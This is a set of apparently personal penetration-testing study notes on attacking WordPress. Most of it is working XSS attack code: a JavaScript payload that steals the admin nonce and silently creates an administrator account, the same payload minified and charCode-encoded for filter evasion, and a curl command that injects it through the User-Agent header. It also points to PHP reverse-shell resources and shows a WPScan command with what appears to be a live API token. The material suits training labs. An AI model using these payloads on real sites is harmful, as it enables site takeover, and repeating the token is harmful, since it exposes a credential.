### Cross-Site Scripting (XSS)  - **XSS Tools - HackTricks**   - [Link](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/xss-tools)  
### Common Special Characters for XSS  - ` > ' " { } ;`  
### Resources  - [Percent-encoding - Wikipedia](https://en.wikipedia.org/wiki/Percent-encoding)  
## Privilege Escalation via XSS 
### JavaScript Code for Nonce  
```javascript var ajaxRequest = new XMLHttpRequest(); var requestURL = "/wp-admin/user-new.php"; var nonceRegex = /ser" value="([^"]*?)"/g; ajaxRequest.open("GET", requestURL, false); ajaxRequest.send(); var nonceMatch = nonceRegex.exec(ajaxRequest.responseText); var nonce = nonceMatch[1]; var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator"; ajaxRequest = new XMLHttpRequest(); ajaxRequest.open("POST", requestURL, true); ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); ajaxRequest.send(params);``

### Compressed JavaScript

javascriptCopy code

`var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);`

### Encoding to JavaScript

javascriptCopy code

`function encode_to_javascript(string) {     var input = string     var output = '';     for(pos = 0; pos < input.length; pos++) {         output += input.charCodeAt(pos);         if(pos != (input.length - 1)) {             output += ",";         }     }     return output; }  let encoded = encode_to_javascript('var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);') console.log(encoded)`

### Result of Code Run in Console



`118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112`

### Usage Example with CURL

`curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(...));</script>" --proxy 127.0.0.1:8080`

### WordPress Reverse Shell

- [WordPress: Reverse Shell - Hacking Articles](https://www.hackingarticles.in/wordpress-reverse-shell/)
### Finding WordPress with WPScan

bashCopy code
`wpscan --url http://offsecwp/`

GET AN API TOKEN!!!!!
┌──(hollacosta㉿kali1)-[~]
└─$ wpscan --url http://alvida-eatery.org --api-token wkxSffDwg1OWHj50PpxpOVybhRIxdfYVCqSYeEzE1F8

### Reverse Shell PHP Script for Wordpress

- [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

Use the **tun0** IP address for the reverse shell.

